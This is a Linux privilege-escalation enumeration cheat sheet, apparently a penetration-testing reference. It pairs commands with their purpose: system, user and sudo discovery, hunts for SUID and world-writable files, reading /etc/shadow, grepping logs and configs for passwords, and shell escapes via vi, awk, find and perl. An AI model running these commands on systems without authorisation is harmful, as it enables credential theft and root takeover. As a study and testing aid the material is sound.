# Linux Enumeration for Escalation Root Access

### os version
Command    Result<br/>
uname -a    Print all available system information<br/>
uname -r    Kernel release<br/>
uname -n    System hostname<br/>
hostname    As above<br/>
uname -m    Linux kernel architecture (32 or 64 bit)<br/>
cat /proc/version    Kernel information<br/>
cat /etc/*-release    Distribution information<br/>
cat /etc/issue    As above<br/>
cat /proc/cpuinfo    CPU information<br/>
df -a    File system information<br/>

----


### Users & Groups:

Command    Result<br/>
cat /etc/passwd    List all users on the system<br/>
cat /etc/group    List all groups on the system<br/>
cat /etc/shadow    Show user hashes – Privileged command<br/>
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'    List all super user accounts<br/>
finger    Users currently logged in<br/>
pinky    As above<br/>
users    As above<br/>
who -a    As above<br/>
w    Who is currently logged in and what they’re doing<br/>
last    Listing of last logged on users<br/>
lastlog    Information on when all users last logged in<br/>
lastlog –u %username%    Information on when the specified user last logged in<br/>

---


### User & Privilege Information:

Command    Result<br/>
whoami    Current username<br/>
id    Current user information<br/>
cat /etc/sudoers    Who’s allowed to do what as root – Privileged command<br/>
sudo -l    Can the current user perform anything as root<br/>

----

### Environmental Information:

Command    Result<br/>
env    Display environmental variables<br/>
set    As above<br/>
echo $PATH    Path information<br/>
history    Displays command history of current user<br/>
pwd    Print working directory, i.e. ‘where am I’<br/>
cat /etc/profile    Display default system variables<br/>

---

### Interesting Files:

Command    Result<br/>
find / -perm -4000 -type f 2>/dev/null    Find SUID files<br/>
find / -uid 0 -perm -4000 -type f 2>/dev/null    Find SUID files owned by root<br/>
find / -perm -2000 -type f 2>/dev/null    Find files with GUID bit set<br/>
find / -perm -2 -type f 2>/dev/null    Find world-writable files<br/>
find / -perm -2 -type d 2>/dev/null    Find word-writable directories<br/>
find /home –name *.rhosts -print 2>/dev/null    Find rhost config files<br/>
ls -ahlR /root/    See if you can access other user directories to find interesting files  – Privileged command<br/>
cat ~/.bash_history    Show the current users’ command history<br/>
ls -la ~/.*_history    Show the current users’ various history files<br/>
ls -la ~/.ssh/     Check for interesting ssh files in the current users’ directory<br/>
ls -la /usr/sbin/in.*    Check Configuration of inetd services<br/>
grep -l -i pass /var/log/*.log 2>/dev/null    Check log files for keywords (‘pass’ in this example) and show positive matches<br/>
find /var/log -type f -exec ls -la {} \; 2>/dev/null    List files in specified directory (/var/log)<br/>
find /var/log -name *.log -type f -exec ls -la {} \; 2>/dev/null    List .log files in specified directory (/var/log)<br/>
find /etc/ -maxdepth 1 -name *.conf -type f -exec ls -la {} \; 2>/dev/null    List .conf files in /etc (recursive 1 level)<br/>
ls -la /etc/*.conf    As above<br/>
find / -maxdepth 4 -name *.conf -type f -exec grep -Hn password {} \; 2>/dev/null    Find .conf files (recursive 4 levels) and output line number where the word password is located<br/>
lsof -i -n    List open files (output will depend on account privileges)<br/>

----

### Service Information:

Command    Result<br/>
ps aux | grep root    View services running as root<br/>
cat /etc/inetd.conf    List services managed by inetd<br/>
cat /etc/xinetd.conf    As above for xinetd<br/>

----

### Jobs/Tasks:

Command    Result<br/>
crontab -l -u %username%    Display scheduled jobs for the specified user – Privileged command<br/>
ls -la /etc/cron*    Scheduled jobs overview (hourly, daily, monthly etc)<br/>
ls -aRl /etc/cron* | awk '$1 ~ /w.$/' 2>/dev/null    What can ‘others’ write in /etc/cron* directories<br/>
top    List of current tasks<br/>

---

### Networking, Routing & Communications:

Command    Result<br/>
/sbin/ifconfig -a    List all network interfaces<br/>
cat /etc/network/interfaces    As above<br/>
arp -a    Display ARP communications<br/>
route    Display route information<br/>
cat /etc/resolv.conf    Show configured DNS sever addresses<br/>
netstat -antp    List all TCP sockets and related PIDs (-p Privileged command)<br/>
netstat -anup    List all UDP sockets and related PIDs (-p Privileged command)<br/>
iptables -L    List rules – Privileged command<br/>
cat /etc/services    View port numbers/services mappings<br/>

----

### Programs Installed:

Command    Result<br/>
dpkg -l    Installed packages (Debian)<br/>
rpm -qa    Installed packages (Red Hat)<br/>
sudo -V    Sudo version – does an exploit exist?<br/>
httpd -v    Apache version<br/>
apache2 -v    As above<br/>
apache2ctl (or apachectl) -M    List loaded Apache modules<br/>
mysql --version    Installed MYSQL version details<br/>
perl -v    Installed Perl version details<br/>
java -version    Installed Java version details<br/>
python --version    Installed Python version details<br/>
ruby -v    Installed Ruby version details<br/>
find / -name %program_name% 2>/dev/null (i.e. nc, netcat, wget, nmap etc)    Locate ‘useful’ programs (netcat, wget etc)<br/>
which %program_name% (i.e. nc, netcat, wget, nmap etc)    As above<br/>

----

### Common Shell Escape Sequences:

Command    Program(s)<br/>
:!bash    vi, vim<br/>
:set shell=/bin/bash:shell    vi, vim<br/>
!bash    man, more, less<br/>
find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;     find<br/>
awk 'BEGIN {system("/bin/bash")}'    awk<br/>
--interactive    nmap<br/>
perl -e 'exec "/bin/bash";'    Perl<br/>
